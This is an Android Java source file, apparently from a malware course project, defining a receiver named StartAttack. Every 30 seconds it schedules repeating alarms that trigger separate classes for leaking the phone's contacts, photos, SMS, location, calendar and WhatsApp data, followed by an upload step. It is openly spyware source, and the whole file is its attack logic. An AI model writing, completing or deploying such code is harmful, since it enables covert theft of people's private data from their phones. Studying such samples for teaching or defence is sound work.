package com.malwareclass.malwareproject;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import java.io.File;
import java.util.Calendar;

public class StartAttack  extends BroadcastReceiver{

    private static final String TAG = "StartAttack";

    private static final Calendar cal = Calendar.getInstance();
    private static final Long TIME = 30000L;

    @Override
    public void onReceive(Context context, Intent intent) {

        Log.d(TAG, "Started");

        AlarmManager alarmManager = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);

        // Contacts leakage
        Intent contactsLeakage = new Intent(context, ContactsLeakage.class);
        contactsLeakage.setAction("CONTACTS_LEAKAGE");
        PendingIntent pendingIntent_contacts = PendingIntent.getBroadcast(context, 0, contactsLeakage, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), TIME, pendingIntent_contacts);

        // DCIM leakage
        Intent DCIMLeakage = new Intent(context, DCIMLeakage.class);
        contactsLeakage.setAction("DCIM_LEAKAGE");
        PendingIntent pendingIntent_DCIM = PendingIntent.getBroadcast(context, 0, DCIMLeakage, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), TIME, pendingIntent_DCIM);

        // SMS leakage
        Intent smsLeakage = new Intent(context, SMSLeakage.class);
        smsLeakage.setAction("SMS_LEAKAGE");
        PendingIntent pendingIntent_SMS = PendingIntent.getBroadcast(context, 0, smsLeakage, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), TIME, pendingIntent_SMS);

        // Location leakage
        Intent locationLeakage = new Intent(context, LocationLeakage.class);
        contactsLeakage.setAction("LOCATION_LEAKAGE");
        PendingIntent pendingIntent_location = PendingIntent.getBroadcast(context, 0, locationLeakage, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), TIME, pendingIntent_location);

        // Calendar Leakage
        Intent calendarLeakage = new Intent(context, CalendarLeakage.class);
        calendarLeakage.setAction("CALENDAR_LEAKAGE");
        PendingIntent pendingIntent_calendar = PendingIntent.getBroadcast(context, 0, calendarLeakage, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), TIME, pendingIntent_calendar);

        // WhatsApp Leakage
        Intent whatsappLeakage = new Intent(context, WhatsAppLeakage.class);
        whatsappLeakage.setAction("WHATSAPP_LEAKAGE");
        PendingIntent pendingIntent_whatsapp = PendingIntent.getBroadcast(context, 0, whatsappLeakage, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), TIME, pendingIntent_whatsapp);

        // upload data
        Intent upload = new Intent(context, UploadData.class);
        upload.setAction("UPLOAD");
        PendingIntent pendingIntent_upload = PendingIntent.getBroadcast(context, 0, upload, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), TIME, pendingIntent_upload);

        Log.i(TAG, "Ended");


    }
}
